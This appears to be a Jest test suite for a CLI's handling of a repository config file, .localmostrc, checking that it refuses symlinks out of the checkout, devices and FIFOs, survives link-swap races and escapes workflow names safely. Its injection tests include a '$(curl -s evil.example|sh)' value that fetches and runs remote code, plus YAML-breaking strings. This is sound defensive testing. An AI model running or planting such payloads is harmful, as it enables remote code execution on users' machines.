/**
 * Finding, reading and writing a .localmostrc on disk.
 *
 * The file comes with the checkout, so whoever controls the repository
 * controls what is at that name: a link out of the checkout, a device, a
 * FIFO. The CLI that reads and writes it runs unsandboxed, as the user.
 */

import { describe, it, expect, beforeEach, afterEach, jest } from '@jest/globals';
import { execFileSync } from 'child_process';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import {
  findLocalmostrc,
  LOCALMOSTRC_FILENAME,
  parseLocalmostrc,
  parseLocalmostrcContent,
  serializeLocalmostrc,
  unreadLocalmostrcNote,
  writeLocalmostrc,
} from './localmostrc';
import { callInChild } from './test-utils/call-in-child';

let root: string;
let repo: string;
let outside: string;

beforeEach(() => {
  root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'localmostrc-file-')));
  repo = path.join(root, 'repo');
  outside = path.join(root, 'outside');
  fs.mkdirSync(repo);
  fs.mkdirSync(outside);
});

afterEach(() => {
  fs.rmSync(root, { recursive: true, force: true });
});

describe('findLocalmostrc', () => {
  it('finds .localmostrc, the one name the runner fetches', () => {
    expect(LOCALMOSTRC_FILENAME).toBe('.localmostrc');
    expect(findLocalmostrc(repo)).toBeNull();
    fs.writeFileSync(path.join(repo, '.localmostrc'), 'version: 1\n');
    expect(findLocalmostrc(repo)).toBe(path.join(repo, '.localmostrc'));
  });

  it.each(['.localmostrc.yml', '.localmostrc.yaml'])('takes %s for no policy, as the runner does', (name) => {
    // The runner fetches only .localmostrc, so a job from this checkout runs
    // on the baseline; testing it under the file's grants would pass a
    // workflow the runner then fails.
    fs.writeFileSync(path.join(repo, name), 'version: 1\n');
    expect(findLocalmostrc(repo)).toBeNull();
  });

  it('refuses a dangling link, which reads as no file and would be written through', () => {
    fs.symlinkSync(path.join(outside, 'victim'), path.join(repo, '.localmostrc'));
    expect(() => findLocalmostrc(repo)).toThrow(/\.localmostrc is not a regular file/);
  });

  it('refuses a link to a file outside the checkout', () => {
    fs.writeFileSync(path.join(outside, 'target'), 'version: 1\n');
    fs.symlinkSync(path.join(outside, 'target'), path.join(repo, '.localmostrc'));
    expect(() => findLocalmostrc(repo)).toThrow(/not a regular file/);
  });

  it('neither follows nor refuses a link under a name it does not read', () => {
    fs.symlinkSync(path.join(outside, 'victim'), path.join(repo, '.localmostrc.yml'));
    expect(findLocalmostrc(repo)).toBeNull();
  });

  it('refuses a directory', () => {
    fs.mkdirSync(path.join(repo, '.localmostrc'));
    expect(() => findLocalmostrc(repo)).toThrow(/not a regular file/);
  });
});

describe('unreadLocalmostrcNote', () => {
  it('names a .yml or .yaml file that is not read, and how to have it read', () => {
    expect(unreadLocalmostrcNote(repo)).toBeNull();
    fs.writeFileSync(path.join(repo, '.localmostrc.yaml'), 'version: 1\n');
    expect(unreadLocalmostrcNote(repo)).toMatch(/^\.localmostrc\.yaml is not read: .*Rename it to \.localmostrc/);
    fs.writeFileSync(path.join(repo, '.localmostrc.yml'), 'version: 1\n');
    expect(unreadLocalmostrcNote(repo)).toMatch(/^\.localmostrc\.yml is not read/);
  });

  it('names a link there without following it', () => {
    fs.symlinkSync(path.join(outside, 'victim'), path.join(repo, '.localmostrc.yml'));
    expect(unreadLocalmostrcNote(repo)).toMatch(/^\.localmostrc\.yml is not read/);
    expect(fs.existsSync(path.join(outside, 'victim'))).toBe(false);
  });
});

describe('parseLocalmostrc', () => {
  it('reads a regular file', () => {
    const file = path.join(repo, '.localmostrc');
    fs.writeFileSync(file, 'version: 1\nshared:\n  network:\n    allow: [github.com]\n');
    const result = parseLocalmostrc(file);
    expect(result.errors).toEqual([]);
    expect(result.config?.shared?.network?.allow).toEqual(['github.com']);
  });

  it('says when there is no file', () => {
    const result = parseLocalmostrc(path.join(repo, '.localmostrc'));
    expect(result.success).toBe(false);
    expect(result.errors[0].message).toMatch(/not found/);
  });

  it('does not follow a link, even one swapped in after the file was found', () => {
    fs.writeFileSync(path.join(outside, 'target'), 'version: 1\n');
    fs.symlinkSync(path.join(outside, 'target'), path.join(repo, '.localmostrc'));
    const result = parseLocalmostrc(path.join(repo, '.localmostrc'));
    expect(result.success).toBe(false);
    expect(result.errors[0].message).toMatch(/not a regular file/);
  });

  // Each read runs in a child: a read of either never returns, and would
  // hang the suite rather than fail it. /dev/urandom rather than /dev/zero,
  // which a job's sandbox will not open: the refusal there came from the
  // open, and never reached the check this is for.
  it.each([
    ['/dev/urandom', () => '/dev/urandom'],
    ['a FIFO', () => {
      const fifo = path.join(repo, 'fifo');
      execFileSync('/usr/bin/mkfifo', [fifo]);
      return fifo;
    }],
  ])('refuses %s without blocking on it', (_label, make) => {
    const target = make();
    const result = callInChild(path.join(__dirname, 'localmostrc.ts'), 'parseLocalmostrc', [target], {
      cwd: repo,
      timeoutMs: 15_000,
    });
    expect(result.timedOut).toBe(false);
    expect(result.status).toBe(0);
    const parsed = JSON.parse(result.output);
    expect(parsed.success).toBe(false);
    expect(parsed.errors[0].message).toMatch(/not a regular file/);
  }, 30_000);
});

describe('writeLocalmostrc', () => {
  const content = 'version: 1\n';

  it('creates the file when there is none, and leaves nothing else behind', () => {
    const file = path.join(repo, '.localmostrc');
    writeLocalmostrc(file, content);
    expect(fs.readFileSync(file, 'utf-8')).toBe(content);
    expect(fs.lstatSync(file).isFile()).toBe(true);
    expect(fs.readdirSync(repo)).toEqual(['.localmostrc']);
  });

  it('creates it readable by others, as a checked-in file is, under the CLI\'s private umask', () => {
    const file = path.join(repo, '.localmostrc');
    const mask = process.umask(0o077);
    try {
      writeLocalmostrc(file, content);
    } finally {
      process.umask(mask);
    }
    expect(fs.statSync(file).mode & 0o777).toBe(0o644);
  });

  it('replaces a regular file, keeping its mode', () => {
    const file = path.join(repo, '.localmostrc');
    fs.writeFileSync(file, 'old\n');
    fs.chmodSync(file, 0o640);
    writeLocalmostrc(file, content);
    expect(fs.readFileSync(file, 'utf-8')).toBe(content);
    expect(fs.statSync(file).mode & 0o777).toBe(0o640);
    expect(fs.readdirSync(repo)).toEqual(['.localmostrc']);
  });

  it('refuses a dangling link and creates nothing where it points', () => {
    const victim = path.join(outside, 'victim');
    fs.symlinkSync(victim, path.join(repo, '.localmostrc'));
    expect(() => writeLocalmostrc(path.join(repo, '.localmostrc'), content)).toThrow(/not a regular file/);
    expect(fs.existsSync(victim)).toBe(false);
    expect(fs.readlinkSync(path.join(repo, '.localmostrc'))).toBe(victim);
    expect(fs.readdirSync(repo)).toEqual(['.localmostrc']);
  });

  it('replaces a link swapped in after its checks rather than writing through it', () => {
    // The checks are lstat; stand in for a link that arrives just after
    // each by having lstat report the regular file that was there before.
    const file = path.join(repo, '.localmostrc');
    const target = path.join(outside, 'target');
    fs.writeFileSync(target, 'theirs\n');
    fs.writeFileSync(path.join(repo, 'was'), 'mine\n');
    const before = fs.lstatSync(path.join(repo, 'was'));
    fs.symlinkSync(target, file);
    const nodeFs = jest.requireActual<typeof fs>('fs');
    const lstat = nodeFs.lstatSync.bind(nodeFs);
    const spy = jest.spyOn(nodeFs, 'lstatSync').mockImplementation(((p: fs.PathLike, ...rest: never[]) =>
      p === file ? before : lstat(p, ...rest)) as typeof fs.lstatSync);
    try {
      writeLocalmostrc(file, content);
    } finally {
      spy.mockRestore();
    }
    expect(fs.readFileSync(target, 'utf-8')).toBe('theirs\n');
    expect(fs.lstatSync(file).isFile()).toBe(true);
    expect(fs.readFileSync(file, 'utf-8')).toBe(content);
  });

  it('checks again before the rename, and refuses a link that arrived while it wrote', () => {
    const file = path.join(repo, '.localmostrc');
    const target = path.join(outside, 'target');
    fs.writeFileSync(target, 'theirs\n');
    fs.symlinkSync(target, file);
    const nodeFs = jest.requireActual<typeof fs>('fs');
    const lstat = nodeFs.lstatSync.bind(nodeFs);
    let first = true;
    const spy = jest.spyOn(nodeFs, 'lstatSync').mockImplementation(((p: fs.PathLike, ...rest: never[]) => {
      if (p !== file || !first) return lstat(p, ...rest);
      first = false;
      const error: NodeJS.ErrnoException = new Error('ENOENT');
      error.code = 'ENOENT';
      throw error;
    }) as typeof fs.lstatSync);
    try {
      expect(() => writeLocalmostrc(file, content)).toThrow(/not a regular file/);
    } finally {
      spy.mockRestore();
    }
    expect(fs.readlinkSync(file)).toBe(target);
    expect(fs.readFileSync(target, 'utf-8')).toBe('theirs\n');
    expect(fs.readdirSync(repo)).toEqual(['.localmostrc']);
  });

  it('refuses a link to a file outside the checkout and leaves that file alone', () => {
    const target = path.join(outside, 'target');
    fs.writeFileSync(target, 'theirs\n');
    fs.symlinkSync(target, path.join(repo, '.localmostrc'));
    expect(() => writeLocalmostrc(path.join(repo, '.localmostrc'), content)).toThrow(/not a regular file/);
    expect(fs.readFileSync(target, 'utf-8')).toBe('theirs\n');
    expect(fs.readdirSync(repo)).toEqual(['.localmostrc']);
  });
});

describe('a workflow name in a written policy', () => {
  // A workflow's name is whatever its file says, so whoever wrote the
  // workflow chooses it. Written as a key, it must read back as that key
  // and nothing else: not end the key, open another line, or run anywhere.
  it.each([
    '$(curl -s evil.example|sh)',
    '`id`',
    'a\nb: 1\n"c": d',
    'x" # y\n  z: [1]',
    'line sep\u0085nel\rcr',
    "quote ' and \\ backslash",
  ])('reads %j back as the same name, on one line', (name) => {
    const text = serializeLocalmostrc({ version: 1, workflows: { [name]: { network: { allow: ['github.com'] } } } });
    const result = parseLocalmostrcContent(text);
    expect(result.errors).toEqual([]);
    expect(Object.keys(result.config?.workflows ?? {})).toEqual([name]);
    expect(result.config?.workflows?.[name]?.network?.allow).toEqual(['github.com']);
    const keyLine = text.split('\n').find((line) => line.startsWith('  ') && !line.startsWith('   '));
    expect(keyLine).toBe(`  ${JSON.stringify(name)}:`);
  });
});
